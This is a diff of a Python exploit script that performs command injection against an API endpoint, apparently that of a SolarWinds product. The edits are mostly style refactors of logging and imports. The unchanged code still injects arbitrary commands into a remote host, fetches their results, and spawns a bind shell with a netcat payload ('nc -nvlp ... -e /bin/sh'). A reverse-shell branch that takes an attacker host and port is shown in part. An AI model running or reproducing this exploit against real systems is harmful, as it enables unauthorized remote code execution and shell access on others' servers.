@@ -6,9 +6,9 @@ import json
 import time
 import base64
 import argparse
-import requests
 import ipaddress
 import logging
+import requests
 
 # Constants
 API_BASE_URL = "/api/swis/resources"
@@ -66,8 +66,8 @@ def validate_ip(ip):
     try:
         ipaddress.ip_address(ip)
         return ip
-    except ValueError:
-        raise argparse.ArgumentTypeError(f"Invalid IP address: {ip}")
+    except ValueError as e:
+        raise argparse.ArgumentTypeError(f"Invalid IP address: {ip}") from e
 
 
 def validate_port(port):
@@ -103,9 +103,10 @@ def send_payload(rhost, rport, payload, credentials=None):
         return response
     except requests.exceptions.HTTPError as http_err:
         # Log specific HTTP error
-        logging.error(f"HTTP error occurred: {http_err} - {response.text}")
+        logging.error("HTTP error occurred: %s - Response: %s",
+                      http_err, response.text)
     except requests.exceptions.RequestException as e:
-        logging.error(f"Error sending the request: {e}")
+        logging.error("Error sending the request: %s", e)
     return None
 
 # Command Injection Functions
@@ -113,7 +114,7 @@ def send_payload(rhost, rport, payload, credentials=None):
 
 def inject_command(rhost, rport, cmd, credentials=None):
     """Injects an arbitrary command."""
-    logging.info(f"Injecting command: {cmd}")
+    logging.info("Injecting command: %s", cmd)
     response = send_payload(rhost, rport, cmd, credentials)
 
     # Log the outcome of sending the payload
@@ -122,20 +123,20 @@ def inject_command(rhost, rport, cmd, credentials=None):
         return
 
     # Log the raw response payload for troubleshooting
-    logging.debug(f"Raw response payload: {response.text}")
+    logging.debug("Raw response payload: %s", response.text)
 
     try:
         response_json = response.json()
     except json.JSONDecodeError as e:
-        logging.error(f"Failed to parse JSON response: {
-                      e} - Raw response: {response.text}")
+        logging.error("Failed to parse JSON response: %s - Raw Response: %s",
+                      e, response.text)
         return
 
     # Ensure response is a list and contains expected structure
     if not isinstance(response_json, list) or not response_json:
         logging.error(
             "Unexpected response structure: expected a non-empty list.")
-        logging.debug(f"Full response: {response_json}")
+        logging.debug("Full response: %s", response_json)
         return
 
     result = response_json[0].get("result", {})
@@ -145,13 +146,13 @@ def inject_command(rhost, rport, cmd, credentials=None):
         logging.error("Failed to obtain results id.")
         return
 
-    logging.info(f"Obtained injection result id: {injection_id}")
+    logging.info("Obtained injection result id: %s", injection_id)
     logging.info("Pausing 5 seconds to await result.")
     time.sleep(5)
 
     # Log the command being checked for results
-    logging.info(f"Retrieving results for command: '{
-                 cmd}' with injection ID: {injection_id}")
+    logging.info(
+        "Retrieving results for command: %s with injection ID: %s", cmd, injection_id)
     get_injection_result(rhost, rport, injection_id, credentials)
 
 
@@ -165,23 +166,23 @@ def get_injection_result(rhost, rport, injection_id, credentials=None):
         # response.raise_for_status()  # Raise an error for bad responses
 
         # Log the raw response payload for troubleshooting
-        logging.debug(f"Raw response payload: {response.text}")
+        logging.debug("Raw response payload: %s", response.text)
 
         # Attempt to parse the JSON response
         try:
             results_data = json.dumps(response.json(), indent=4)
-            logging.info(f"Command injection results for id {injection_id}:")
+            logging.info("Command injection results for id %s", injection_id)
             print(results_data)
             return True
         except json.JSONDecodeError:
             logging.error("Error parsing JSON response.")
             return False
     except requests.exceptions.HTTPError as http_err:
-        logging.error(f"HTTP error occurred: {
-                      http_err} - Status Code: {response.status_code} - Response: {response.text}")
+        logging.error("HTTP error occurred: %s - Status Code: %s - Response: %s",
+                      http_err, response.status_code, response.text)
         return False
     except requests.exceptions.RequestException as e:
-        logging.error(f"Error obtaining injection results: {e}")
+        logging.error("Error obtaining injection results: %s", e)
         return False
 
 # Shell Spawning Function
@@ -190,14 +191,14 @@ def get_injection_result(rhost, rport, injection_id, credentials=None):
 def spawn_shell(shell_type, rhost, rport, lhost=None, lport=None, credentials=None):
     """Handles the spawning of bind or reverse shells."""
     if shell_type == "bind":
-        logging.info(f"Spawning a bind shell on {rhost} with port {lport}")
+        logging.info("Spawning a bind shell on %s with port %s", rhost, lport)
         if lport is None:
             logging.error("Target bind port is required for bind shell.")
             return
         payload = f"nc -nvlp {lport} -e /bin/sh"
     elif shell_type == "reverse":
-        logging.info(f"Spawning a reverse shell from {
-                     rhost} to {lhost} on port {lport}")
+        logging.info(
+            "Spawning a reverse shell from %s to %s on port %s", rhost, lhost, lport)
         if lhost is None or lport is None:
             logging.error(
                 "Attacker host and port are required for reverse shell.")
